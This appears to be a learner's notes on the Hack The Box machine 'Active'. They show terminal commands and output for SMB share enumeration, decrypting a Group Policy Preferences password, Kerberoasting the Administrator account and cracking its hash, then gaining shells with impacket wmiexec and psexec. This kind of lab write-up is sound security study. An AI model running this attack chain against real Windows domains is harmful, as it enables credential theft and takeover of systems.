@@ -1,0 +1,286 @@
+
+
+smbmap -H 10.10.10.100
+________ ___ ___ _______ ___ ___ __ _______
+/" )|" \ /" || _ "\ |" \ /" | /""\ | __ "\
+(: \___/ \ \ // |(. |_) :) \ \ // | / \ (. |__) :)
+\___ \ /\ \/. ||: \/ /\ \/. | /' /\ \ |: ____/
+__/ \ |: \. |(| _ \ |: \. | // __' \ (| /
+/" \ :) |. \ /: ||: |_) :)|. \ /: | / / \ \ /|__/ \
+(_______/ |___|\__/|___|(_______/ |___|\__/|___|(___/ \___)(_______)
+-----------------------------------------------------------------------------
+SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
+https://github.com/ShawnDEvans/smbmap
+[*] Detected 1 hosts serving SMB
+[*] Established 1 SMB connections(s) and 1 authenticated session(s)
+[+] IP: 10.129.26.60:445 Name: active.htb Status: Authenticated
+Disk Permissions Comment
+---- ----------- -------
+The only share accessible with anonymous credentials is the Replication share. Upon connecting and
+examining its contents, it appears to be a replica of the SYSVOL share. This is particularly interesting from a
+privilege escalation standpoint, as Group Policies—and potentially Group Policy Preferences—are stored
+within SYSVOL , which is readable by all authenticated users. For more details on exploiting this, refer to this
+resource.
+Let's connect to the Replication share and recursively download its contents, paying special attention to
+the Groups.xml file. This file often contains username and password combinations, which can be valuable
+for exploitation.
+The Groups.xml file reads as follows.
+ADMIN$ NO ACCESS Remote Admin
+C$ NO ACCESS Default share
+IPC$ NO ACCESS Remote IPC
+NETLOGON NO ACCESS Logon server
+share
+Replication READ ONLY
+SYSVOL NO ACCESS Logon server
+share
+Users NO ACCESS
+[*] Closed 1 connections
+
+
+
+
+smbclient //10.10.10.100/Replication
+Password for [WORKGROUP\htb-c4rm3l0]:
+Anonymous login successful
+Try "help" to get a list of possible commands.
+smb: \> RECURSE ON
+smb: \> PROMPT OFF
+smb: \> mget *
+<...SNIP...>
+getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-
+00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml of size 533 as
+active.htb/Policies/{31B2F340-016D-11D2-945F-
+00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml (12.4 KiloBytes/sec) (average 15.5
+KiloBytes/sec)
+<...SNIP...>
+
+
+finally. a helpful Groups.xml file.
+
+The Groups.xml file reads as follows.
+
+<?xml version="1.0" encoding="utf-8"?>
+<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-
+8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06"
+uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName=""
+description=""
+cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw
+/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0"
+userName="active.htb\SVC_TGS"/></User>
+</Groups>
+We can obtain the username SVC_TGS , as well as an encrypted password from the Groups.xml file.
+
+
+
+┌──(kali㉿kali)-[~]
+└─$ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ  
+GPPstillStandingStrong2k18
+                                                                                                                   
+┌──(kali㉿kali)-[~]
+└─$ impacket-GetNPUsers active.htb/svc_tgs -dc-ip 10.10.10.100 -request             
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+Password:
+No entries found!
+                                                                                                                   
+┌──(kali㉿kali)-[~]
+└─$ impacket-GetUserSPNs active.htb/svc_tgs -dc-ip 10.10.10.100 -request 
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+Password:
+ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
+--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
+active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2025-08-10 20:13:34.714958             
+
+
+
+[-] CCache file is not found. Skipping...
+$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$98565eb3aae2aa18c4c69c91c3421679$3396014b9b5342bccec25a675a2e615c4d5e14f28d7adeb1aa3bfe227a0ac38e3b17d91b152bc2cb967f3cde35eed9553f2a62c4b7d9f2c25427a34e40bdcee7e84aebab975e0f374fd611f05a9e95687aa658f561f5388056811fbdfa50222593b6fb9e468a6019685a8303162cd82ad6e9c20d80b963b01c29b832ecbc39f4732c0b4526439fc2a46c2ec0400e3d36e67955172c2a5beb92f7354f7373ba2b4e7d5c24a18dff5f213cb02a06d57180324bc8f7ae2883ee21d733f5325a9e5c6dc43277bdf1426e875d035201e69be8e7255eda8b8078e5780d1a65c65906b40bc0f80f870392d71b67a2a25a0adee0931758e5f478eddf4c0499e8512df2f78642b8bdcfc9c1ae9f8862351e29bea9e8f5f688420c4fef8d6e50db45715e3625dbbb8f88583e02b472c2088bea9fabc8fd96acaf0403bb0c482df32b5e5f29c91f7ef4818eee813ad51a2709a4e8e760c33221aedf33a16bdad4602bc6086cc31fea795892e8ea8ef5337405e3654ed50ab5c626c87ddf1536873cb8b05e8acaf5f2c01f661254dcd7c84e0e1eb2af86e13a4cec8a0942168be614e700c246afbabdd6cb2858e550653a72e1ed10d11a2cf9729161c48f96b7f48f338fbb57e6ba22feb5595f7378d92f26966a128817fa616e28c8cf18a4b8046f22e65faa39753e9a30a895144bf14a42e2e80d92dbced375090a3c710e7ff46a79bafc6aed72c25bbc04ced8d4e80f8d2de3f3e530e3bd19f443fd34c03a31cfb2bc959af4cff1b9f6a0d53c02845ccd4414e44963ab0286308f135d481b254a23ab318cbadb807929595e956b2e7edf14e0eb1ffb7ead7988252755ae4fe5f8c299319c5b7bb81139ccf1ddb27385a95cc3672bffefd0a6036b78c576ec05afa67f7ffc81c765b1caf90093eaa7358038ccabe9682686a357b5196e275ce0f32608669170328f283103342dbf90773028d9875222f926e2354922d732d75369613204dd91525996c73d1be0d31a4f47b0fd8604260c79a89775e2848e86ce73977b8ac4dc8c9ce6e276bfb5f7f2d6227789978152f9f85f3baa113d6a284aae2c59f2f3753c36abab83147a07daee43d0068eaf249f69eabc290ab1880e9c0a7292554a798d62b2b7cc12336bab2028290c24f72987a334e2e4aac845d0e2a3bdab6c949b86dde4bde720ca5fd1ace3759d2fe8f84157dc5168f3398276afadaba87380e3886bcb3705dca0db0296b0faf6d76881c581fd72993b8d5a76
+                                                                                                                   
+┌──(kali㉿kali)-[~]
+└─$ 
+
+hash cracked to
+Ticketmaster1968
+
+
+This happens because the remote Windows system is using a non-default code page (character encoding), so some characters (like accented letters or symbols) are not decoded correctly by your tool (psexec or wmiexec). That’s why you see “��” instead of proper characters.
+
+Why is wmiexec output cleaner?
+
+wmiexec.py uses WMI to execute commands and capture output, which often handles encoding better and avoids some of the quirks of SMB pipes used by psexec.py.
+psexec.py relies on SMB and may not handle code pages or output formatting as well, especially with non-ASCII characters.
+
+┌──(kali㉿kali)-[~]
+└─$ impacket-wmiexec active.htb/administrator:Ticketmaster1968@10.10.10.100
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] SMBv2.1 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+C:\>ls
+'ls' is not recognized as an internal or external command,
+operable program or batch file.
+
+C:\>dir
+[-] Decoding error detected, consider running chcp.com at the target,
+map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
+and then execute wmiexec.py again with -codec and the corresponding codec
+
+ Volume in drive C has no label.
+ Volume Serial Number is 15BB-D59C
+
+ Directory of C:\
+
+14/07/2009  06:20 ��    <DIR>          PerfLogs
+12/01/2022  04:11 ��    <DIR>          Program Files
+21/01/2021  07:49 ��    <DIR>          Program Files (x86)
+21/07/2018  05:39 ��    <DIR>          Users
+11/08/2025  03:42 ��    <DIR>          Windows
+               0 File(s)              0 bytes
+               5 Dir(s)   1.162.559.488 bytes free
+
+C:\>
+C:\>cd Users
+C:\Users>dir
+[-] Decoding error detected, consider running chcp.com at the target,
+map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
+and then execute wmiexec.py again with -codec and the corresponding codec
+ Volume in drive C has no label.
+ Volume Serial Number is 15BB-D59C
+
+ Directory of C:\Users
+
+21/07/2018  05:39 ��    <DIR>          .
+21/07/2018  05:39 ��    <DIR>          ..
+16/07/2018  01:14 ��    <DIR>          Administrator
+14/07/2009  07:57 ��    <DIR>          Public
+21/07/2018  06:16 ��    <DIR>          SVC_TGS
+               0 File(s)              0 bytes
+               5 Dir(s)   1.162.559.488 bytes free
+
+C:\Users>cd Administrator
+C:\Users\Administrator>dir
+[-] Decoding error detected, consider running chcp.com at the target,
+map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
+and then execute wmiexec.py again with -codec and the corresponding codec
+ Volume in drive C has no label.
+ Volume Serial Number is 15BB-D59C
+
+ Directory of C:\Users\Administrator
+
+16/07/2018  01:14 ��    <DIR>          .
+16/07/2018  01:14 ��    <DIR>          ..
+30/07/2018  04:50 ��    <DIR>          Contacts
+21/01/2021  07:49 ��    <DIR>          Desktop
+30/07/2018  04:50 ��    <DIR>          Documents
+21/01/2021  07:52 ��    <DIR>          Downloads
+30/07/2018  04:50 ��    <DIR>          Favorites
+30/07/2018  04:50 ��    <DIR>          Links
+30/07/2018  04:50 ��    <DIR>          Music
+30/07/2018  04:50 ��    <DIR>          Pictures
+30/07/2018  04:50 ��    <DIR>          Saved Games
+30/07/2018  04:50 ��    <DIR>          Searches
+30/07/2018  04:50 ��    <DIR>          Videos
+               0 File(s)              0 bytes
+              13 Dir(s)   1.162.555.392 bytes free
+
+C:\Users\Administrator>cd Desktop
+C:\Users\Administrator\Desktop>dir
+[-] Decoding error detected, consider running chcp.com at the target,
+map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
+and then execute wmiexec.py again with -codec and the corresponding codec
+ Volume in drive C has no label.
+ Volume Serial Number is 15BB-D59C
+
+ Directory of C:\Users\Administrator\Desktop
+
+21/01/2021  07:49 ��    <DIR>          .
+21/01/2021  07:49 ��    <DIR>          ..
+11/08/2025  03:13 ��                34 root.txt
+               1 File(s)             34 bytes
+               2 Dir(s)   1.162.559.488 bytes free
+
+C:\Users\Administrator\Desktop>more root.txt
+...
+
+C:\Users\Administrator\Desktop>chcp.com
+Active code page: 737
+
+C:\Users\Administrator\Desktop>[-] 
+
+737 is Greek! Running this new command cleans the encoding issue. 
+                                                                                                                    
+┌──(kali㉿kali)-[~]
+└─$ impacket-wmiexec active.htb/administrator:Ticketmaster1968@10.10.10.100 -codec cp737
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] SMBv2.1 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+C:\>ls
+'ls' is not recognized as an internal or external command,
+operable program or batch file.
+
+C:\>dir
+ Volume in drive C has no label.
+ Volume Serial Number is 15BB-D59C
+
+ Directory of C:\
+
+14/07/2009  06:20 πμ    <DIR>          PerfLogs
+12/01/2022  04:11 μμ    <DIR>          Program Files
+21/01/2021  07:49 μμ    <DIR>          Program Files (x86)
+21/07/2018  05:39 μμ    <DIR>          Users
+11/08/2025  03:45 πμ    <DIR>          Windows
+               0 File(s)              0 bytes
+               5 Dir(s)   1.162.559.488 bytes free
+
+C:\>cd Users
+C:\Users>
+
+For fun...
+
+┌──(kali㉿kali)-[~]
+└─$ impacket-psexec active.htb/administrator:Ticketmaster1968@10.10.10.100 -codec cp737
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Requesting shares on 10.10.10.100.....
+[*] Found writable share ADMIN$
+[*] Uploading file xXmwBSLc.exe
+[*] Opening SVCManager on 10.10.10.100.....
+[*] Creating service izTG on 10.10.10.100.....
+[*] Starting service izTG.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32> dir
+ Volume in drive C has no label.
+ Volume Serial Number is 15BB-D59C
+
+ Directory of C:\Windows\system32
+
+12/01/2022  04:12 μμ    <DIR>          .
+12/01/2022  04:12 μμ    <DIR>          ..
+14/07/2009  08:41 πμ    <DIR>          0409
+11/06/2009  12:16 πμ             2.151 12520437.cpx
+11/06/2009  12:16 πμ             2.233 12520850.cpx
+20/11/2010  04:18 πμ         3.727.872 accessibilitycpl.dll
+14/07/2009  04:03 πμ            39.424 ACCTRES.dll
+14/07/2009  04:14 πμ             7.680 acledit.dll
+14/07/2009  04:14 πμ           125.440 aclui.dll
+20/11/2010  04:18 πμ            45.568 acppage.dll
+20/11/2010  04:18 πμ           744.448 ActionCenter.dll
+20/11/2010  04:18 πμ           537.600 ActionCenterCPL.dll
+20/11/2010  04:18 πμ           202.752 activeds.dll
+14/07/2009  02:37 πμ           111.616 activeds.tlb
+01/01/2018  04:59 πμ           309.760 actxprxy.dll
+14/07/2009  04:14 πμ            38.912 AdapterTroubleshooter.exe
+20/11/2010  04:18 πμ           438.272 AdmTmpl.dll
+20/11/2010  04:18 πμ           851.456 adprop.dll
+04/03/2014  12:17 μμ            49.664 adprovider.dll
+20/11/2010  04:18 πμ           638.976 adsiedit.dll
+11/06/2009  12:21 πμ           144.380 adsiedit.msc
+20/11/2010  04:18 πμ           186.880 adsldp.dll
+....
